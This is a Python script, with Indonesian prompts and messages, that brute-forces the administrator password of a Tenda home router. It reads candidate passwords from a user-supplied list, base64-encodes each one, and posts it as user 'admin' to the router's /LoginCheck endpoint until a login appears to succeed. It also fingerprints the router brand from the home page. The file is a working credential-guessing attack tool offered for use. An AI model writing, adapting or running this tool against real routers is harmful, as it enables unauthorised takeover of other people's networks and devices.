try:
    import os,sys,requests,base64
    from bs4 import BeautifulSoup
except ModuleNotFoundError:
    print(f"ada modul yang belum terinstal, cek :\n› \033[36mnano router.py\033[0m")

os.system("cls" if os.name == "nt" else "clear");print("Router : Tenda ⛺\nRedirect : 192.168.0.1/login.asp\n")
def encode_password(password):
    return base64.b64encode(password.encode('utf-8')).decode('utf-8')
def deteksi_nama_router(session):
    try:
        response = session.get("http://192.168.0.1", timeout=5)
    except requests.exceptions.Timeout:
        print("[\033[1m\033[33m*\033[0m] Timeout!")
        return "Router tak terdeteksi"

    if "TP-LINK" in response.text:
        return "TP-LINK"
    elif "Tenda" in response.text:
        return "Tenda"
    elif "Netgear" in response.text:
        return "Netgear"
    elif "D-Link" in response.text:
        return "D-Link"
    elif "Asus" in response.text:
        return "Asus"
    elif "Linksys" in response.text:
        return "Linksys"
    elif "ZTE" in response.text:
        return "ZTE"
    elif "Huawei" in response.text:
        return "Huawei"
    return "Router ?"

def jika_error(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    error_message = soup.find("span", id="message-error")
    if error_message:
        return error_message.text.strip()
    return "Login gagal ×"

url = "http://192.168.0.1/LoginCheck"
try:
    lokasi_file = input("[\033[1m\033[32m*\033[0m] List Password File : ")
    if lokasi_file == '':
       exit()
except KeyboardInterrupt:
    pass
    sys.exit()

try:
    with open(lokasi_file, 'r') as file:
        passwords = file.read().splitlines()
except FileNotFoundError:
    print(f"[\033[1m\033[31m*\033[0m] File '{lokasi_file}' tak ditemukan!")
    exit(1)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded'
}

session = requests.Session()
nama_router = deteksi_nama_router(session)
print(f"\n[\033[1m\033[32m*\033[0m] Nama Router : {nama_router}\n")
for password in passwords:
    encoded_password = encode_password(password)
    data = {
        'Username': 'admin',
        'Password': encoded_password,
        'checkEn': '0'
    }
    try:
        response = session.post(url, data=data, headers=headers, timeout=5)
    except requests.exceptions.Timeout:
        print(f"[\033[1m\033[31m*\033[0m] Timeout '{password}'")
        continue
    except KeyboardInterrupt:
        pass
        sys.exit()
    print(f"[\033[1m\033[32m*\033[0m] Mencoba password ⇒ {password}")
    if "login failed" in response.text.lower() or "error" in response.text.lower():
        error_message = jika_error(response)
        print(f"[\033[1m\033[31m*\033[0m] Login gagal: {password} {error_message}")
    else:
        print(f"\n[\033[1m\033[33m*\033[0m] \033[32mLogin berhasil! Password : {password}")
        break
else:
    print("\n[\033[1m\033[31m!\033[0m] Semua password sudah dicoba, tidak ada yang berhasil.")
